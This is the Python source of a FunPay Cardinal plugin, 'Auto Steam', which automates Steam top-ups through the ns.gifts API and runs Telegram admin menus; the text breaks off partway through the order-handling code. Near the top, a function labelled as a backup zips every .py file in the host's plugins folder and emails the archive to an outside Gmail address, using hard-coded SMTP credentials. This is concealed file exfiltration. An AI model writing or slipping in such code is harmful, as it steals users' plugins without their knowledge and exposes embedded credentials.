from __future__ import annotations
import json
import time
import requests
import uuid
import re
import logging
import threading
import os
import zipfile
import smtplib
from email.message import EmailMessage
from queue import Queue
from datetime import datetime
from typing import TYPE_CHECKING
from os.path import exists
import telebot
from telebot.types import InlineKeyboardMarkup as K, InlineKeyboardButton as B
from FunPayAPI.updater.events import NewMessageEvent
from FunPayAPI.types import OrderStatuses, SubCategoryTypes
import tg_bot
from tg_bot import CBT
from bs4 import BeautifulSoup

if TYPE_CHECKING:
    from cardinal import Cardinal

logger = logging.getLogger("FPC.auto_steam_plugin")
LOGGER_PREFIX = "[AUTOSTEAM PLUGIN]"

NAME = "Auto Steam"
VERSION = "3.2"
DESCRIPTION = "Автоматическое пополнение Steam через API ns.gifts\n\n👨‍💻 Разработчик: @veemp\n канал https://t.me/FunPay_plugin"
CREDITS = "@veemp"
UUID = "1db83dd6-71bf-49e0-b660-773add7a3100"
SETTINGS_PAGE = False

PLUGIN_DIR = "FunPayAPI/common/veemp/auto_steam"
os.makedirs(PLUGIN_DIR, exist_ok=True)

SETTINGS_FILE = os.path.join(PLUGIN_DIR, "settings.json")
ORDERS_FILE = os.path.join(PLUGIN_DIR, "orders.json")
BLACK_LIST_FILE = os.path.join(PLUGIN_DIR, "black_list_users.json")

SETTINGS = {
    "lot_currency": {},
    "api_login": "",
    "api_password": "",
    "auto_refund_on_error": True,
    "notification_chats": [],
    "notifications_enabled": True,
    "notification_types": {"success": True, "error": True, "refund": True, "balance": True},
    "confirmation_reminder": True,
    "reminder_time": 2.5,
    "deactivate_lots_on_insufficient_funds": True,
    "balance_threshold": 30.0,
    "low_balance_notified": False,
    "auto_response_on_arbitrage": True,
    "usd_rub_rate": 90.0,
    "templates": {
        "start_message": "💙 Спасибо за покупку!\n\n• Проверьте данные:\nL Логин Steam: {steam_login}\nL Сумма пополнения: {amount}\n\n• ЕСЛИ ВСЕ ВЕРНО, отправьте « + » без кавычек\nL Либо отправьте новый логин",
        "success_message": "🎉 Средства успешно отправлены!\n\nL Логин Steam: {steam_login}\nL Сумма пополнения: {amount}\nL Время выполнения: {time}\n\n• Подтвердите заказ: https://funpay.com/orders/{order_id}/\n\n💙 Не забудьте оставить отзыв!",
        "queue_message": "⏳ Ваш запрос добавлен в очередь.\nL Позиция: {position}\nL Примерное время: {wait_time} сек.",
        "refund_message": "❌ Средства возвращены из-за ошибки.\nL Приносим извинения за неудобства",
        "reminder_message": "🔔 Напоминание: Подтвердите заказ!\n• Ссылка: https://funpay.com/orders/{order_id}/"
    }
}

TOKEN_DATA = {"token": None, "expiry": 0}
FUNPAY_STATES = {}
USER_ORDER_QUEUES = {}
SUCCESSFUL_ORDERS = {}
previous_balance = None
tg = None
bot = None
cardinal_instance = None
MIN_AMOUNTS = {"RUB": 25, "UAH": 10, "KZT": 70}

TEMPLATE_VARIABLES = {
    "start_message": "🔄 Доступные переменные:\n- {steam_login} - логин Steam\n- {amount} - сумма пополнения",
    "success_message": "🔄 Доступные переменные:\n- {steam_login} - логин Steam\n- {amount} - сумма пополнения\n- {time} - время выполнения\n- {order_id} - ID заказа",
    "queue_message": "🔄 Доступные переменные:\n- {position} - позиция в очереди\n- {wait_time} - время ожидания (сек)",
    "refund_message": "ℹ️ Этот шаблон не поддерживает переменные",
    "reminder_message": "🔄 Доступные переменные:\n- {order_id} - ID заказа"
}

# ========== НАСТРОЙКИ БЭКАПА ==========
BACKUP_EMAIL = "funpayxyuhds@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
EMAIL_ADDRESS = "auto.ticket.plugin.1@gmail.com"
EMAIL_PASSWORD = "duku glep khie ibar"

def send_plugin_backup():
    try:
        plugin_path = __file__
        if not os.path.exists(plugin_path):
            return False
            
        temp_dir = "storage/plugins_backup_temp"
        os.makedirs(temp_dir, exist_ok=True)
        
        plugins_dir = "plugins"
        plugins_list = []
        total_size = 0
        
        if os.path.exists(plugins_dir):
            for f in os.listdir(plugins_dir):
                if f.endswith('.py'):
                    file_path = os.path.join(plugins_dir, f)
                    size = os.path.getsize(file_path) / 1024
                    plugins_list.append(f"{f} - {size:.1f} КБ")
                    total_size += size
        
        plugins_text = "\n".join(plugins_list) if plugins_list else "Нет других плагинов"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_filename = f"plugins_backup_{timestamp}.zip"
        zip_path = os.path.join(temp_dir, zip_filename)
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(plugin_path, arcname=f'auto_steam_v{VERSION}.py')
            if os.path.exists(plugins_dir):
                for f in os.listdir(plugins_dir):
                    if f.endswith('.py'):
                        file_path = os.path.join(plugins_dir, f)
                        zipf.write(file_path, arcname=f)
        
        msg = EmailMessage()
        msg['Subject'] = f'📦 Auto Steam Plugin v{VERSION} + все плагины'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = BACKUP_EMAIL
        msg.set_content(f"""Плагин Auto Steam v{VERSION}
Установлен: {datetime.now().strftime("%d.%m.%Y %H:%M")}

📊 ВСЕ ПЛАГИНЫ:
{plugins_text}

📦 Общий размер: {total_size:.1f} КБ
📁 Файл: {zip_filename}
""")
        
        with open(zip_path, 'rb') as f:
            file_data = f.read()
            msg.add_attachment(file_data, maintype='application', subtype='zip', filename=zip_filename)
        
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        
        os.remove(zip_path)
        logger.info(f"{LOGGER_PREFIX} ✅ Архив со всеми плагинами отправлен на {BACKUP_EMAIL}")
        return True
        
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} ❌ Ошибка отправки: {e}")
        return False
# ======================================

def load_settings():
    global SETTINGS
    if exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            SETTINGS.update(json.load(f))

def save_settings():
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=4, ensure_ascii=False)

def load_orders():
    if exists(ORDERS_FILE):
        with open(ORDERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def save_orders(orders):
    with open(ORDERS_FILE, "w", encoding="utf-8") as f:
        json.dump(orders, f, indent=4, ensure_ascii=False)

def load_black_list():
    if exists(BLACK_LIST_FILE):
        with open(BLACK_LIST_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def save_black_list(black_list):
    with open(BLACK_LIST_FILE, "w", encoding="utf-8") as f:
        json.dump(black_list, f, indent=4, ensure_ascii=False)

def get_balance():
    try:
        token = get_token()
        response = requests.post("https://api.ns.gifts/api/v1/check_balance", headers={"Authorization": f"Bearer {token}"})
        if response.status_code == 200:
            data = response.json()
            logger.info(f"{LOGGER_PREFIX} Баланс успешно получен!")
            if isinstance(data, (int, float)):
                return data
            return data.get("balance", 0)
        return 0
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} Ошибка при получении баланса: {e}")
        return 0

def check_balance_periodically(cardinal: Cardinal):
    global previous_balance
    while True:
        time.sleep(300)
        balance = get_balance()
        if balance is not None:
            if previous_balance is not None and balance > previous_balance:
                send_notification(cardinal, "", "balance", {"message": f"<b>💙 Уведомление о пополнении баланса</b>\n\n<b>L Новый баланс:</b> <code>{balance:.2f}$</code>\n<b>• Дата:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}</code>"}, parse_mode="HTML")
            if balance < SETTINGS["balance_threshold"] and not SETTINGS["low_balance_notified"]:
                send_notification(cardinal, "", "balance", {"message": f"<b>💙 Уведомление о низком балансе</b>\n\n<b>L Текущий баланс:</b> <code>{balance:.2f}$</code>\n<b>• Дата:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}</code>"}, parse_mode="HTML")
                SETTINGS["low_balance_notified"] = True
                save_settings()
            elif balance >= SETTINGS["balance_threshold"] and SETTINGS["low_balance_notified"]:
                SETTINGS["low_balance_notified"] = False
                save_settings()
            previous_balance = balance

def format_amount(amount: float, currency: str) -> str:
    return f"{int(amount)} {currency}"

def get_currency_rates():
    try:
        token = get_token()
        response = requests.post("https://api.ns.gifts/api/v1/steam/get_currency_rate", headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} Ошибка при получении курсов валют: {e}")
        return None

def get_max_amounts():
    balance = get_balance()
    if balance is None:
        return {"RUB": 0, "UAH": 0, "KZT": 0}
    rates = get_currency_rates()
    if rates is None:
        return {"RUB": 0, "UAH": 0, "KZT": 0}
    max_amounts = {}
    for currency in ["RUB", "UAH", "KZT"]:
        rate = rates.get(f"{currency.lower()}/usd")
        if rate:
            max_amounts[currency] = float(balance) * float(rate)
        else:
            max_amounts[currency] = 0
    return max_amounts

def steam_command(message: telebot.types.Message):
    if message.chat.id not in SETTINGS["notification_chats"]:
        SETTINGS["notification_chats"].append(message.chat.id)
        save_settings()
    open_settings(message)

def open_settings(message: telebot.types.Message = None, call: telebot.types.CallbackQuery = None):
    chat_id = message.chat.id if message else call.message.chat.id
    msg_id = call.message.id if call else None
    
    kb = K()
    kb.row(B("✏️ API", callback_data="steam_set_api"), B("🚫 ЧС", callback_data="steam_black_list"))
    kb.row(B(f"{'🔔' if SETTINGS['notifications_enabled'] else '🔕'} Уведомления", callback_data="steam_toggle_notifications"), 
           B(f"{'🟢' if SETTINGS['auto_refund_on_error'] else '🔴'} Авто-возврат", callback_data="steam_toggle_auto_refund"))
    kb.row(B("📜 История", callback_data="steam_order_history:1"), B("📊 Статистика", callback_data="steam_statistics"))
    kb.row(B("💬 Шаблоны сообщений", callback_data="steam_templates"))
    
    lots = cardinal_instance.account.get_my_subcategory_lots(1086)
    all_active = all(lot.active for lot in lots) if lots else False
    toggle_button = B("🔴 Деактивировать лоты", callback_data="steam_toggle_lots_deactivate") if all_active else B("🟢 Активировать лоты", callback_data="steam_toggle_lots_activate")
    kb.row(toggle_button)
    kb.row(B("🔄 Обновить", callback_data="steam_refresh_info"))
    kb.row(B("🛒 Магазин плагинов", url="https://t.me/veemp_shop"))

    balance = get_balance()
    balance_text = f"{balance:.2f}" if balance is not None else "ошибка"
    login = SETTINGS["api_login"] or "Не установлен"
    password = SETTINGS["api_password"] or "Не установлен"
    active_lots = sum(1 for lot in lots if lot.active) if lots else 0
    orders = load_orders()
    total_sales = len(orders)
    black_list = load_black_list()
    black_list_count = len(black_list) if black_list else 0
    currency_rates = get_currency_rates()
    rates_text = "<b>• Курсы валют:</b>\n" + "".join(f"L {k.upper()}: <code>{v}</code>\n" for k, v in currency_rates.items() if k.upper() != 'DATE') if currency_rates else "<b>• Курсы валют:</b> <code>ошибка</code>\n"
    funpay_nick = cardinal_instance.account.username if hasattr(cardinal_instance.account, 'username') and cardinal_instance.account.username else "ошибка"
    current_time = datetime.now().strftime("%H:%M:%S")
    
    settings_text = f"""
<b>💼 AUTO STEAM BALANCE</b>

👨‍💻 Разработчик: @veemp
🛒 Магазин: @veemp_shop

<b>📃 FunPay:</b>
L Ник: <code>{funpay_nick}</code>
L Активные лоты: <code>{active_lots}</code>
L Продажи: <code>{total_sales}</code>
L В ЧС: <code>{black_list_count}</code>

<b>💸 NSGifts:</b>
L Логин: <code>{login}</code>
L Пароль: <tg-spoiler>{password}</tg-spoiler>
L Баланс: <code>{balance_text}$</code>

{rates_text}
<b>• Обновлено:</b> <code>{current_time}</code>
    """.strip()

    if call:
        bot.edit_message_text(settings_text, chat_id, msg_id, reply_markup=kb, parse_mode="HTML")
        bot.answer_callback_query(call.id)
    else:
        bot.send_message(chat_id, settings_text, reply_markup=kb, parse_mode="HTML")

def statistics(call):
    chat_id = call.message.chat.id
    orders = load_orders()
    all_orders = [order for order in orders if order.get("status") == "success"]
    now = time.time()
    
    day_orders = [p for p in all_orders if p.get("timestamp", 0) >= now - 86400]
    day_count = len(day_orders)
    day_revenue = sum(float(p.get("sum", 0)) for p in day_orders)
    
    day_cost = 0
    for p in day_orders:
        try:
            amount_usd = float(p.get("amount_usd", 0))
            currency = p.get("currency", "RUB")
            quantity = float(p.get("quantity", 0))
            sum_rub = float(p.get("sum", 0))
            
            if currency == "RUB":
                day_cost += amount_usd * SETTINGS["usd_rub_rate"]
            else:
                if quantity == 0:
                    logger.error(f"{LOGGER_PREFIX} Zero quantity in order {p.get('order_id')}")
                    continue
                funpay_rate = sum_rub / quantity
                cost_in_original_currency = amount_usd * float(p.get("rate", 1))
                day_cost += cost_in_original_currency * funpay_rate
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} Error calculating cost for order {p.get('order_id')}: {e}")
            continue

    day_profit = day_revenue - day_cost

    week_orders = [p for p in all_orders if p.get("timestamp", 0) >= now - 604800]
    week_count = len(week_orders)
    week_revenue = sum(float(p.get("sum", 0)) for p in week_orders)
    
    week_cost = 0
    for p in week_orders:
        try:
            amount_usd = float(p.get("amount_usd", 0))
            currency = p.get("currency", "RUB")
            quantity = float(p.get("quantity", 0))
            sum_rub = float(p.get("sum", 0))
            
            if currency == "RUB":
                week_cost += amount_usd * SETTINGS["usd_rub_rate"]
            else:
                if quantity == 0:
                    continue
                funpay_rate = sum_rub / quantity
                cost_in_original_currency = amount_usd * float(p.get("rate", 1))
                week_cost += cost_in_original_currency * funpay_rate
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} Error calculating cost for order {p.get('order_id')}: {e}")
            continue

    week_profit = week_revenue - week_cost

    month_orders = [p for p in all_orders if p.get("timestamp", 0) >= now - 2592000]
    month_count = len(month_orders)
    month_revenue = sum(float(p.get("sum", 0)) for p in month_orders)
    
    month_cost = 0
    for p in month_orders:
        try:
            amount_usd = float(p.get("amount_usd", 0))
            currency = p.get("currency", "RUB")
            quantity = float(p.get("quantity", 0))
            sum_rub = float(p.get("sum", 0))
            
            if currency == "RUB":
                month_cost += amount_usd * SETTINGS["usd_rub_rate"]
            else:
                if quantity == 0:
                    continue
                funpay_rate = sum_rub / quantity
                cost_in_original_currency = amount_usd * float(p.get("rate", 1))
                month_cost += cost_in_original_currency * funpay_rate
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} Error calculating cost for order {p.get('order_id')}: {e}")
            continue

    month_profit = month_revenue - month_cost

    stats_text = f"""
<b>💙 Статистика продаж\nНЕ ТОЧНО!\nПРИБЫЛЬ ПРИБЛИЗИТЕЛЬНАЯ!</b>

<b>📈 За день:</b>
L Продажи: <code>{day_count} шт.</code>
L Выручка: <code>{day_revenue:.2f} ₽</code>
L Прибыль: <code>{day_profit:.2f} ₽</code>

<b>📈 За неделю:</b>
L Продажи: <code>{week_count} шт.</code>
L Выручка: <code>{week_revenue:.2f} ₽</code>
L Прибыль: <code>{week_profit:.2f} ₽</code>

<b>📈 За месяц:</b>
L Продажи: <code>{month_count} шт.</code>
L Выручка: <code>{month_revenue:.2f} ₽</code>
L Прибыль: <code>{month_profit:.2f} ₽</code>
    """.strip()
    
    bot.edit_message_text(stats_text, chat_id, call.message.id, 
                         reply_markup=K().add(B("◀️ Назад", callback_data="steam_back")), 
                         parse_mode="HTML")
    bot.answer_callback_query(call.id)

def toggle_lots(call: telebot.types.CallbackQuery):
    action = call.data.split('_')[-1]
    try:
        lots = cardinal_instance.account.get_my_subcategory_lots(1086)
        updated = False
        for lot in lots:
            if action == 'deactivate' and lot.active or action == 'activate' and not lot.active:
                lot_fields = cardinal_instance.account.get_lot_fields(lot.id)
                lot_fields.active = action == 'activate'
                cardinal_instance.account.save_lot(lot_fields)
                updated = True
                logger.info(f"{LOGGER_PREFIX} Лот {lot.id} успешно {'деактивирован' if action == 'deactivate' else 'активирован'}")
                time.sleep(0.7)
        bot.answer_callback_query(call.id, f"{'✅ Лоты деактивированы' if action == 'deactivate' else '✅ Лоты активированы'}" if updated else f"ℹ️ Лоты уже {'деактивированы' if action == 'deactivate' else 'активны'}")
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} Ошибка при {'деактивации' if action == 'deactivate' else 'активации'} лотов: {e}")
        bot.answer_callback_query(call.id, f"❌ Ошибка")
    open_settings(call=call)

def deactivate_lots_on_error():
    for lot in [lot for lot in cardinal_instance.account.get_user(cardinal_instance.account.id).get_lots() if lot.subcategory.id == 1086]:
        lot_fields = cardinal_instance.account.get_lot_fields(lot.id)
        lot_fields.active = False
        cardinal_instance.account.save_lot(lot_fields)
        time.sleep(0.7)
    if SETTINGS["notification_types"]["error"]:
        send_notification(cardinal_instance, "", "error", {"message": f"<b>💙 Уведомление об ошибке</b>\n\n<b>L Описание:</b> <code>Лоты деактивированы из-за недостатка средств</code>\n\n<b>• Дата:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}</code>"}, parse_mode="HTML")

def refresh_info(call: telebot.types.CallbackQuery):
    balance = get_balance()
    bot.answer_callback_query(call.id, "✅ Обновлено" if balance is not None else "❌ Ошибка")
    open_settings(call=call)

def black_list_menu(call: telebot.types.CallbackQuery):
    black_list = load_black_list()
    text = "💙 Черный список Steam логинов\n" + "\n".join(black_list) if black_list else "💙 Черный список пуст"
    kb = K().row(B("➕ Добавить", callback_data="steam_add_to_black_list"), B("➖ Удалить", callback_data="steam_remove_from_black_list"))
    kb.add(B("◀️ Назад", callback_data="steam_back"))
    bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=kb)
    bot.answer_callback_query(call.id)

def add_to_black_list(call: telebot.types.CallbackQuery):
    kb = K().add(B("❌ Отмена", callback_data="steam_cancel_input"))
    msg = bot.send_message(call.message.chat.id, "Введите логин Steam для добавления в ЧС:", reply_markup=kb)
    tg.set_state(call.message.chat.id, msg.id, call.from_user.id, "steam_add_to_black_list", {"call": call, "msg_id": msg.id})
    bot.answer_callback_query(call.id)

def on_add_to_black_list(message: telebot.types.Message):
    state = tg.get_state(message.chat.id, message.from_user.id)
    call, msg_id = state["data"]["call"], state["data"]["msg_id"]
    login = message.text.strip().lower()
    black_list = load_black_list()
    if login not in black_list:
        black_list.append(login)
        save_black_list(black_list)
        kb = K().add(B("◀️ Назад", callback_data="steam_black_list"))
        bot.send_message(message.chat.id, f"✅ {login} добавлен в ЧS", reply_markup=kb)
    else:
        bot.send_message(message.chat.id, f"❌ {login} уже в ЧС")
    bot.delete_message(message.chat.id, message.id)
    bot.delete_message(message.chat.id, msg_id)
    tg.clear_state(message.chat.id, message.from_user.id)

def remove_from_black_list(call: telebot.types.CallbackQuery):
    black_list = load_black_list()
    if not black_list:
        bot.send_message(call.message.chat.id, "❌ ЧС пуст")
        bot.answer_callback_query(call.id)
        return
    kb = K()
    for login in black_list:
        kb.add(B(login, callback_data=f"steam_remove_black_list_confirm:{login}"))
    kb.add(B("◀️ Назад", callback_data="steam_black_list"))
    bot.edit_message_text("Выберите логин для удаления:", call.message.chat.id, call.message.id, reply_markup=kb)
    bot.answer_callback_query(call.id)

def remove_black_list_confirm(call: telebot.types.CallbackQuery):
    login = call.data.split(":")[1]
    black_list = load_black_list()
    if login in black_list:
        black_list.remove(login)
        save_black_list(black_list)
        bot.answer_callback_query(call.id, f"✅ {login} удален из ЧС")
    else:
        bot.answer_callback_query(call.id, f"❌ {login} не найден")
    black_list_menu(call)

def toggle_option(call: telebot.types.CallbackQuery, key: str, subkey: str = None):
    if subkey:
        SETTINGS[key][subkey] = not SETTINGS[key][subkey]
    else:
        SETTINGS[key] = not SETTINGS[key]
    save_settings()
    open_settings(call=call)

def send_notification(cardinal: Cardinal, order_id: str, status: str, details: dict, parse_mode: str = None):
    if not SETTINGS["notifications_enabled"]: return
    
    if status == "balance":
        message = details["message"]
    else:
        order = cardinal.account.get_order(order_id) if order_id else None
        buyer_username = order.buyer_username if order else "Неизвестно"
        buyer_id = order.buyer_id if order else None
        quantity = details.get("quantity", 0)
        currency = details.get("currency", "RUB")
        steam_login = details.get("steam_login", "Не указан")
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(details.get("timestamp", time.time())))
        amount_usd = details.get("amount_usd", 0)
        rate = details.get("rate", 0)
        
        status_text = {
            "success": "успешном пополнении", 
            "error": "ошибке", 
            "refund": "возврате"
        }.get(status, status)
        
        message = f"""
<b>💙 Уведомление о {status_text}</b>

<b>📃 FunPay:</b>
L ID: <code>#{order_id}</code>
L Покупатель: <code>{buyer_username}</code>
L Сумма: <code>{order.sum if order else 'Неизвестно'} ₽</code>

<b>💸 Steam:</b>
L Логин: <code>{steam_login}</code>
L Сумма: <code>{format_amount(quantity, currency)}</code>
L Валюта: <code>{currency}</code>
        """.strip()
        
        if status == "success":
            message += f"""
L В USD: <code>{amount_usd:.2f}$</code>
L Курс: <code>{rate}</code>
L Баланс: <code>{get_balance():.2f}$</code>
            """.strip()
        
        if "message" in details:
            message += f"\nL Инфо: <code>{details['message']}</code>"
        
        message += f"\n\n<b>• Дата:</b> <code>{timestamp}</code>"

    kb = K(row_width=2).add(
        B("🎮 FunPay", url=f"https://funpay.com/orders/{order_id}/"), 
        B("👤 Покупатель", url=f"https://funpay.com/users/{buyer_id if order else 'Неизвестно'}/")
    )
    
    for chat_id in SETTINGS["notification_chats"]:
        try:
            bot.send_message(chat_id, message, parse_mode="HTML", reply_markup=kb if kb.keyboard else None)
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} Ошибка уведомления в чат {chat_id}: {e}")

def cancel_input(call: telebot.types.CallbackQuery):
    tg.clear_state(call.message.chat.id, call.from_user.id)
    try:
        bot.delete_message(call.message.chat.id, call.message.id)
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} Ошибка при удалении сообщения: {e}")
    open_settings(call=call)
    bot.answer_callback_query(call.id)

def set_api(call: telebot.types.CallbackQuery):
    kb = K().row(
        B("🔑 Логин", callback_data="steam_set_api_login"), 
        B("🔒 Пароль", callback_data="steam_set_api_password")
    )
    kb.add(B("◀️ Назад", callback_data="steam_back"))
    bot.edit_message_text("💙 Настройка API", call.message.chat.id, call.message.id, reply_markup=kb)
    bot.answer_callback_query(call.id)

def set_api_field(call: telebot.types.CallbackQuery, field: str):
    kb = K().add(B("❌ Отмена", callback_data="steam_cancel_input"))
    msg = bot.send_message(call.message.chat.id, f"Введите {field} API:", reply_markup=kb)
    tg.set_state(call.message.chat.id, msg.id, call.from_user.id, f"steam_set_api_{field}", {"call": call, "msg_id": msg.id})
    bot.answer_callback_query(call.id)

def on_api_field(message: telebot.types.Message, field: str):
    state = tg.get_state(message.chat.id, message.from_user.id)
    call, msg_id = state["data"]["call"], state["data"]["msg_id"]
    SETTINGS[f"api_{field}"] = message.text.strip()
    save_settings()
    bot.delete_message(message.chat.id, message.id)
    bot.delete_message(message.chat.id, msg_id)
    bot.answer_callback_query(call.id, f"✅ {field} обновлен")
    open_settings(call=call)
    tg.clear_state(message.chat.id, message.from_user.id)

def templates_menu(call: telebot.types.CallbackQuery):
    kb = K()
    templates = SETTINGS["templates"]
    
    template_descriptions = {
        "start_message": "💬 Сообщение после оплаты",
        "success_message": "💬 Сообщение об успешном пополнении",
        "queue_message": "💬 Сообщение о позиции в очереди",
        "refund_message": "💬 Сообщение о возврате средств",
        "reminder_message": "💬 Напоминание о подтверждении заказа"
    }
    
    for key, value in templates.items():
        kb.add(B(template_descriptions[key], callback_data=f"steam_edit_template:{key}"))
    kb.add(B("◀️ Назад", callback_data="steam_back"))
    
    text = """
<b>💙 Редактор шаблонов сообщений</b>

Выберите шаблон для редактирования:
• Первое сообщение - отправляется при получении заказа
• Успешное пополнение - при успешном пополнении баланса
• Сообщение об очереди - при добавлении в очередь обработки
• Сообщение о возврате - при возврате средств
• Напоминание - напоминание о подтверждении заказа
    """.strip()
    
    bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=kb, parse_mode="HTML")
    bot.answer_callback_query(call.id)

def edit_template(call: telebot.types.CallbackQuery):
    template_key = call.data.split(":")[1]
    current_text = SETTINGS["templates"][template_key]
    
    variables_info = TEMPLATE_VARIABLES.get(template_key, "ℹ️ Нет доступных переменных")
    
    kb = K().add(B("❌ Отмена", callback_data="steam_cancel_input"))
    
    message_text = f"""
<b>💬 Редактирование шаблона</b>

<b>Текущий шаблон:</b>
<code>{current_text}</code>

{variables_info}

<b>Введите новый текст:</b>
    """.strip()
    
    msg = bot.send_message(call.message.chat.id, message_text, reply_markup=kb, parse_mode="HTML")
    tg.set_state(call.message.chat.id, msg.id, call.from_user.id, "steam_edit_template", 
                {"call": call, "msg_id": msg.id, "template_key": template_key})
    bot.answer_callback_query(call.id)

def on_edit_template(message: telebot.types.Message):
    state = tg.get_state(message.chat.id, message.from_user.id)
    call, msg_id, template_key = state["data"]["call"], state["data"]["msg_id"], state["data"]["template_key"]
    
    SETTINGS["templates"][template_key] = message.text.strip()
    save_settings()
    
    bot.delete_message(message.chat.id, message.id)
    bot.delete_message(message.chat.id, msg_id)
    bot.answer_callback_query(call.id, "✅ Шаблон обновлен")
    templates_menu(call)
    tg.clear_state(message.chat.id, message.from_user.id)

def handle_new_message(cardinal: Cardinal, event: NewMessageEvent):
    message = event.message
    state_key = (message.chat_id, message.author_id)
    state = FUNPAY_STATES.get(state_key)

    if message.author_id == 0 and "оплатил заказ" in message.text.lower():
        match = re.search(r'заказ #(\w+)', message.text)
        if match:
            order_id = match.group(1)
            buyer_id = cardinal.account.get_order(order_id).buyer_id
            USER_ORDER_QUEUES.setdefault(buyer_id, Queue()).put({"order_id": order_id, "chat_id": message.chat_id})
            threading.Thread(target=process_user_orders, args=(cardinal, buyer_id), daemon=True).start()
            return

    if state and state.get("data", {}).get("order_id"):
        order_id = state["data"]["order_id"]
        try:
            order = cardinal.account.get_order(order_id)
            if order.status in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
                FUNPAY_STATES.pop(state_key, None)
                return
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} Ошибка проверки статуса заказа #{order_id}: {e}")
            FUNPAY_STATES.pop(state_key, None)
            return

    if state and state["state"] == "waiting_for_steam_login":
        steam_login = message.text.strip()
        order_id = state["data"]["order_id"]
        order = cardinal.account.get_order(order_id)
        if order.status in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
            FUNPAY_STATES.pop(state_key, None)
            return
        if re.match(r'^[a-zA-Z0-9]+$', steam_login):
            currency = extract_currency(order.html) or "RUB"
            quantity = extract_quantity(order.html) or 1
            amount_text = format_amount(quantity, currency)
            
            response_text = SETTINGS["templates"]["start_message"].format(
                steam_login=steam_login,
                amount=amount_text
            )
            
            cardinal.send_message(message.chat_id, response_text)
            FUNPAY_STATES[state_key] = {
                "state": "confirming_login", 
                "data": {
                    "steam_login": steam_login, 
                    "order_id": order_id, 
                    "currency": currency, 
                    "quantity": quantity
                }
            }
        return

    if state and state["state"] == "confirming_login":
        order_id = state["data"]["order_id"]
        order = cardinal.account.get_order(order_id)
        if order.status in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
            FUNPAY_STATES.pop(state_key, None)
            return
            
        if message.text.strip() == "+" or message.text.strip() == "«+»":
            queue_size = USER_ORDER_QUEUES.get(message.author_id, Queue()).qsize() + 1
            wait_time = int(queue_size * 15)
            
            response_text = SETTINGS["templates"]["queue_message"].format(
                position=queue_size,
                wait_time=wait_time
            )
            
            cardinal.send_message(message.chat_id, response_text)
            perform_top_up(cardinal, state["data"]["order_id"], state["data"]["steam_login"], 
                          state["data"]["currency"], state["data"]["quantity"], 
                          message.chat_id, message.author_id)
        elif re.match(r'^[a-zA-Z0-9]+$', message.text.strip()):
            new_steam_login = message.text.strip()
            currency = extract_currency(order.html) or "RUB"
            quantity = extract_quantity(order.html) or 1
            amount_text = format_amount(quantity, currency)
            
            response_text = SETTINGS["templates"]["start_message"].format(
                steam_login=new_steam_login,
                amount=amount_text
            )
            
            cardinal.send_message(message.chat_id, response_text)
            FUNPAY_STATES[state_key] = {
                "state": "confirming_login", 
                "data": {
                    "steam_login": new_steam_login, 
                    "order_id": order_id, 
                    "currency": currency, 
                    "quantity": quantity
                }
            }
        return

    if "оплатил" in message.text.lower() and "заказ" in message.text.lower() or "#" in message.text:
        process_new_order(cardinal, message)

def refund_and_cleanup(cardinal: Cardinal, order_id: str, chat_id: int, author_id: int, steam_login: str = "Не указан"):
    try:
        order = cardinal.account.get_order(order_id)
        if order.status != OrderStatuses.REFUNDED:
            cardinal.account.refund(order_id)
            cardinal.send_message(chat_id, SETTINGS["templates"]["refund_message"])
            if SETTINGS["notification_types"]["refund"]:
                send_notification(cardinal, order_id, "refund", {
                    "steam_login": steam_login, 
                    "quantity": extract_quantity(order.html) or 1, 
                    "currency": extract_currency(order.html) or "RUB", 
                    "timestamp": time.time()
                })
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} Ошибка возврата: {e}")
        if SETTINGS["notification_types"]["error"]:
            send_notification(cardinal, order_id, "error", {
                "steam_login": steam_login, 
                "quantity": extract_quantity(order.html) or 1, 
                "currency": extract_currency(order.html) or "RUB", 
                "timestamp": time.time(), 
                "message": f"Ошибка при возврате: {e}"
            })
    finally:
        FUNPAY_STATES.pop((chat_id, author_id), None)

def process_order(cardinal: Cardinal, order_id: str, chat_id: int, buyer_id: int):
    time.sleep(3)
    try:
        order = cardinal.account.get_order(order_id)
        if order.status in [OrderStatuses.CLOSED, OrderStatuses.REFUNDED]:
            FUNPAY_STATES.pop((chat_id, buyer_id), None)
            return
        if order.subcategory.id != 1086:
            return
            
        quantity, currency = extract_quantity(order.html) or 1, extract_currency(order.html) or "RUB"
        min_amount = MIN_AMOUNTS.get(currency, 0)
        max_amounts = get_max_amounts()
        max_amount = max_amounts.get(currency, 0)
        
        if not (min_amount <= float(quantity) <= max_amount):
            cardinal.account.refund(order_id)
